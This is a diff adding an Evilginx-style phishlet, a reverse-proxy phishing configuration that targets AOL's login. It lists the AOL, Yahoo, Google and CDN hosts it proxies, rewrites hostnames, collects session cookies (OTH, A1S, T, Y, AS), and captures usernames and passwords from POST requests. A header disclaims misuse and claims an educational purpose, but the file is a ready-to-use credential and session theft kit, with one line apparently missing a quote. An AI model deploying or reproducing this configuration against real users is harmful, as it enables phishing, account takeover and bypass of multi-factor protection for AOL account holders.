@@ -1,0 +1,78 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+author: '@an0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'aol.com', session: true, auto_filter: true, is_landing: true}
+  - {phish_sub: 'api.login', orig_sub: 'api.login', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'oidc.www', orig_sub: 'oidc.www', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'oidc.mail', orig_sub: 'oidc.mail', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'udc', orig_sub: 'udc', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'video-api.yql', orig_sub: 'video-api.yql', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'yep.video', orig_sub: 'yep.video', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: false, auto_filter: false, is_landing: false}
+  - {phish_sub: 's', orig_sub: 's', domain: 'aolcdn.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'o', orig_sub: 'o', domain: 'aolcdn.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'api-2-0', orig_sub: 'api-2-0', domain: 'spot.im', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'static-cdn', orig_sub: 'static-cdn', domain: 'spot.im', auto_filter: true, session: false, is_landing: false}
+  - {phish_sub: 'launcher', orig_sub: 'launcher', domain: 'spot.im', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'consent.cmp', orig_sub: 'consent.cmp', domain: 'oath.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, auto_filter: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: true, auto_filter: true, is_landing: false}
+  - {phish_sub: 'login', orig_sub: login', domain: 'yahoo.net', session: false, auto_filter: false, is_landing: false}
+  
+# https://login.yahoo.net/account/challenge/recaptcha/recaptcha-script?lang=en-gb&intl=uk&done=https%3A%2F%2Fwww.aol.com%2F&sessionIndex=Qg--&acrumb=xHpsBupD&display=login&authMechanism=primary&siteKey=6LcbmroaAAAAANQ34XOxul9o_UgaJ6dkdq62Xey6&recaptchaDomain=www.google.com
+# https://recaptcha/enterprise.js?hl=&onload=recaptchaLoadCallback&render=explicit
+
+# https:\u002F\u002Flogin.yahoo.net\u002Faccount\u002Fchallenge\u002Frecaptcha\u002Frecaptcha-script?display=login&lang=en-US
+
+
+sub_filters:
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'google.com', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'google.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: 'https:\u002F\u002Flogin.yahoo.net', replace: 'https:\u002F\u002Flogin.{domain}', mimes: ['text/html']}
+
+
+  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+auth_tokens:
+  - domain: '.aol.com'
+    keys: ['OTH', 'A1S', '.*,regexp']
+  - domain: '.login.aol.com'
+    keys: ['T', 'Y', 'AS', '.*,regexp']
+  - domain: '.www.aol.com'
+    keys: ['OTHP', '.*,regexp']    
+
+auth_urls:
+  - '/'
+  
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.aol.com'
+  path: '/'
+
